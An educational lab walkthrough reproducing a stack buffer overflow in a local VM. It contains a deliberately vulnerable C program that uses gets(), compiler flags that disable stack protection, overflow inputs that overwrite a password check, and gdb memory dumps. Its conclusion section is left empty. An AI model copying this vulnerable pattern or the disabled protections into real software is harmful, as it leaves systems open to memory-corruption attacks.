# Reproducing an Stack Based Buffer Overflow exploit

## Introduction

A buffer overflow occurs when a program overruns adjacent memory locations of a given running program leading the system behavior to erros, chrashes or incorrect result.

In this guide, I will demonstrate the operation of a buffer overflow exploit, we are going to change a password variable within a vulnerable program illustrating how can an attacker gain access to an assumed secure program by overwriting the current/real password in the stack memory of a C program, and finally we will also see how it affects the **CONFIDENTIALITY AND INTEGRITY** of the system. 

We will impair the availability of the program generating a segmentation fault error which occurs when a program attempts to access an ilegal memory location, a violation in memory in most standards computers will trigger the OS kernel to perform a corrective action leading the program to be interrupted, which might affect the **AVAILABILITY** 

## Reproducing the exploit in your environment 

If you want to reproduce this demonstration in your own desktop, you need is to install [Vagrant](https://www.vagrantup.com/) to create the box(Virtual Machine) and [VirtualBox](https://www.virtualbox.org/wiki/Downloads) to be able to deploy the vagrant box. Clone this repository in your environment and spin up the [vagrant box](https://github.com/tavaresrodrigo/StackOverflow/blob/main/Vagrantfile) by running the command below, it can take some time to download the Ubuntu ISO file:

```bash
$ vagrant up
```

Check the status of the VM:

```bash
$ vagrant status
Current machine states:

stackoverflow             running (virtualbox)
```

Connect to the virtual machine via ssh:

```bash
$ vagrant ssh stackoverflow
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 04 Mar 2021 02:51:49 PM UTC

[...]

```

Become root:

```bash
vagrant@stackoverflow:~$ sudo su
root@stackoverflow:/home/vagrant#
```

After you have finished with this laboratory you can destroy your virtual machine by running:

```bash
$ vagrant destroy stackoverflow
    stackoverflow: Are you sure you want to destroy the 'stackoverflow' VM? [y/N] y
==> stackoverflow: Forcing shutdown of VM...
==> stackoverflow: Destroying VM and associated drives...
```

## A bit of memory 

Understanding stack-based overflow attacks requires at least an elementray knowledge of memory layout, let's review some very important concepts. 

### Stack memory: 

Stack is the memory in which we store variables created by functions,  methods, and reference to variables, it's temporary, when the program is finished the memory will be automatically erased and the area freed up, the stack is managed by the CPU – so you don’t have to allocate or release memory manually.

![stack memory graph ](https://github.com/tavaresrodrigo/StackOverflow/blob/main/stack.png)
### Heap memory

The heap is used by programming languages to store large block of memory, it's also known as dynamic memory. Unlike the stack the heap is managed by the programmer, in C for example, variables are allocated and freed using functions like malloc() and free().

![stack memory vs heap memory comparison ](https://github.com/tavaresrodrigo/StackOverflow/blob/main/stackvsheap.png)


## The stack overflow exploit

When the execution stack grows beyond the memory that is reserved for it, you will cause a stack overflow as the stack will eventually consume more memory than is reserved for it and eventually overwrite other buffers in the same stack. 

### The exploit

The [code](https://github.com/tavaresrodrigo/StackOverflow/blob/main/code.c) used to illustrate the exploit has a number of security red flags.

``` C
#include <signal.h>
#include <stdio.h>
#include <string.h>
int main(){
	char realPassword[8];
	char givenPassword[8];

	strncpy(realPassword, "ffffffff", 8);
	gets(givenPassword);
	
	if (0 == strncmp(givenPassword, realPassword, 8)){
		printf("SUCCESS!\n");
	}else{
		printf("FAILURE!\n");
	}
	raise(SIGINT);
	printf("givenPassword: %s\n", givenPassword);
    printf("realPassword: %s\n", realPassword);
	return 0;
}
``` 

### gets()

The function **gets()** is used to read an arbitrary amount of data into a stack buffer without limiting the amount of data to read, it just reads the data and dumps it into memory, this function does not matches the size of the data read with the size of the buffer, in our case **8**, which means we can pass any value to the buffer and it will be written into the stack memory.

### Compiling the code

For years attackers have been exploiting vulnerabilities in the stack memory, so it's expected the compilers have developed mechanisms to protect the program execution against these attacks, for this reason we will disable them in order to be able to reproduce the segmentation fault, in order to compile the program you should use the parameters below:

``` bash
# gcc -fno-stack-protector -z execstack -o code code.c
```

Look at the compiler alert **"the `gets' function is dangerous and should not be used."**:

```bash
code.c: In function ‘main’:
code.c:9:2: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration]
    9 |  gets(givenPassword);
      |  ^~~~
      |  fgets
/usr/bin/ld: /tmp/ccipvQhp.o: in function `main':
code.c:(.text+0x2a): warning: the `gets' function is dangerous and should not be used.
```
### Running the code

The [programmer](https://blog.rapid7.com/2019/02/19/stack-based-buffer-overflow-attacks-what-you-need-to-know/)[1] had configured a **SIGINT** in the code that allows us to use the debugger[2] to dive deep in the stack frames and confirm what is happening at the memory level, let's run the program and pass "aaaaaaaa" 8xa which will dump 2 frames in the stack as we can see below: 

```bash
(gdb) run
Starting program: /home/vagrant/StackOverflow/code
aaaaaaaaaaaaaaaa
FAILURE!
```

Now let's check the area of memory where our 16x was stored, first we need to check where exactly the stack memory is :

```bash
(gdb) info frame
Stack level 0, frame at 0x7fffffffe480:
 rip = 0x7ffff7e1618b in __GI_raise (../sysdeps/unix/sysv/linux/raise.c:50); saved rip = 0x555555555237
 called by frame at 0x7fffffffe4d0
 source language c.
 Arglist at 0x7fffffffe358, args: sig=<optimized out>
 Locals at 0x7fffffffe358, Previous frame's sp is 0x7fffffffe480
  Saved registers:
  rip at 0x7fffffffe478
```

We already know from where to start the search so let's show at least 100 frames on the screen:

```bash
(gdb) x/100x 0x7fffffffe358
[...]
0x7fffffffe468:	0x6b453000	0x0ddcad0a	0x00000000	0x00000000
0x7fffffffe478:	0x55555237	0x00005555	0x61616161	0x61616161
0x7fffffffe488:	0xf7fc0f00	0x00007fff	0xf7fc0f00	0x00007fff
0x7fffffffe498:	0x55555270	0x00005555	0x66666666	0x66666666
0x7fffffffe4a8:	0x555550e0	0x00005555	0xffffe5b0	0x00007fff
[...]
```

### Overwriting the program variable in the stack

In [ASCII](https://www.rapidtables.com/code/text/ascii-table.html) [3] "a" is 61 and "f" is 66, so as we could see the 2 frames filled up with our input, and most importantly, we noticed there are only 4 frames (16K) between the area of memory which is storing the realPassword "0x66666666", what happens if we store 52xa (12+1 frames) running our program one more time ?

```bash
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/vagrant/StackOverflow/code
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
SUCCESS!
```
Voila, **SUCCESS** the realPassword has been overwritten and the new password in memory now is equivalent to "realPassword, "aaaaaaaa", 8"., if we check the memory again we will confirm that the following frames were dumped with "0x61616161":

```bash
(gdb) x/100x 0x7fffffffe358
[...]
0x7fffffffe468:	0x553fd900	0x4d79bf14	0x00000000	0x00000000
0x7fffffffe478:	0x55555237	0x00005555	0x6d6d6f63	0x20646e61
0x7fffffffe488:	0x61616161	0x61616161	0x61616161	0x61616161
0x7fffffffe498:	0x61616161	0x61616161	0x61616161	0x61616161
0x7fffffffe4a8:	0x61616161	0x61616161	0x61616161	0x61616161
0x7fffffffe4b8:	0x00000000	0x00000000	0x00000000	0x00000000
[...]

```

### Triggering a segmentation fault 

As we could see already, there is no limits for the gets() function, what happens if we create an input with lets say  300xa? Let's see, but first let's remove the interruption in the code, this time we will create the interruption during the code runtime by providing an input that will overwrite the stack, if you understood the stack memory correctly you will notice that memory of the variable will be automatically erased and the area freed up to the give space for the new dump, our final code must be something like that:

``` C
#include <signal.h>
#include <stdio.h>
#include <string.h>
int main(){
	char realPassword[8];
	char givenPassword[8];

	strncpy(realPassword, "ffffffff", 8);
	gets(givenPassword);
	
	if (0 == strncmp(givenPassword, realPassword, 8)){
		printf("SUCCESS!\n");
	}else{
		printf("FAILURE!\n");
	}
//	raise(SIGINT); <------ remove or comment this line
	printf("givenPassword: %s\n", givenPassword);
    printf("realPassword: %s\n", realPassword);
	return 0;
}
``` 

Let's run the command again:

``` bash
# gcc -fno-stack-protector -z execstack -o code code.c
```
``` bash
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/vagrant/StackOverflow/code
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

Now have have reproduced a Segmentation fault which triggered the Kernel to send the signal [SIGSEGV](https://man7.org/linux/man-pages/man7/signal.7.html)[4] interrupting the currently-executing machine instruction trying to save the state on the stack to make it possible to continue the execution later [5]. 

```bash
(gdb) x/100x 0x7fffffffe4c0
[...]
0x7fffffffe500:	0x61616161	0x61616161	0x61616161	0x61616161
0x7fffffffe510:	0x61616161	0x61616161	0x61616161	0x61616161
0x7fffffffe520:	0x61616161	0x61616161	0x61616161	0x61616161
0x7fffffffe530:	0x61616161	0x61616161	0x61616161	0x61616161
0x7fffffffe540:	0x61616161	0x61616161	0x61616161	0x61616161
0x7fffffffe550:	0x61616161	0x61616161	0x61616161	0x61616161
0x7fffffffe560:	0x61616161	0x61616161	0x61616161	0x61616161
[...]
```

## Conclusion

In this tutorial 

For improved security,

Check also,

## References


[1]https://blog.rapid7.com/2019/02/19/stack-based-buffer-overflow-attacks-what-you-need-to-know/    
[2]https://www.gnu.org/software/gdb/    
[3]https://www.rapidtables.com/code/text/ascii-table.html  
[4]https://man7.org/linux/man-pages/man7/signal.7.html     
[5]https://unix.stackexchange.com/questions/257598/how-does-a-segmentation-fault-work-under-the-hood
[6]https://owasp.org/www-community/vulnerabilities/Buffer_Overflow          
[7]https://www.youtube.com/watch?v=1S0aBV-Waeo          
